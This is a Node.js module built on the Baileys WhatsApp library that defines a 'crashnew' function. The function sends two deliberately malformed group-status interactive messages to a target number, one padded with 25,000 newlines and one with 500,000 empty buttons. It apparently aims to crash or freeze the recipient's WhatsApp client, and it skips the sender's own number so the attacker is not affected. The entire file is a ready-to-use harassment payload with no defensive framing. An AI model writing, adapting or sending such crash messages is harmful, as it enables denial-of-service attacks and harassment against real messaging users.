const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function crashnew(sock, target) {
    if (!sock || !target) {
        console.log('[crashnew] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // If target resolves to the sender's own number, do nothing.
    // This is what stops the paired number from getting hit.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[crashnew] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // if JID resolution fails, fall through and attempt the send
    }

    const rezzonly6 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐆𝐀𝐁𝐔𝐓 𝐀𝐍𝐉𝐈𝐍𝐆"
                    },
                    nativeFlowMessage: {
                        buttons: "\u200B" + "\n".repeat(25000)
                    }
                }
            }
        }
    };

    const rezzonly7 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "🦠Shahzu Here😹"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, rezzonly6, { noSelfSync: true });
        await sock.relayMessage(target, rezzonly7, { noSelfSync: true });
    } catch (e) {
        console.log('[crashnew]', (e && e.message) ? e.message : e);
    }
}

module.exports = { crashnew };
